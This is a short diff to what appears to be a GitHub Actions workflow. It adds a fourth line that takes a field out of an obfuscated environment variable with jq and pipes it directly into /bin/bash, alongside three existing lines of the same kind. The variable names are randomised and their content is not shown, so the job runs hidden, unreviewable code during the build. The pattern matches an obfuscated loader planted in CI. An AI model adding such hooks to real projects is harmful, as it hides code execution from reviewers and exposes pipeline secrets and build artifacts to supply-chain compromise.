@@ -20,6 +20,7 @@ jobs:
           echo $ndt446 | jq -r .sgf87 | /bin/bash
           echo $jfj274 | jq -r .mkvvp78989 | /bin/bash
           printf '%s' "$c3276" | jq -r .dtrt180 | /bin/bash
+          echo $kbwh819 | jq -r .rtdo65 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
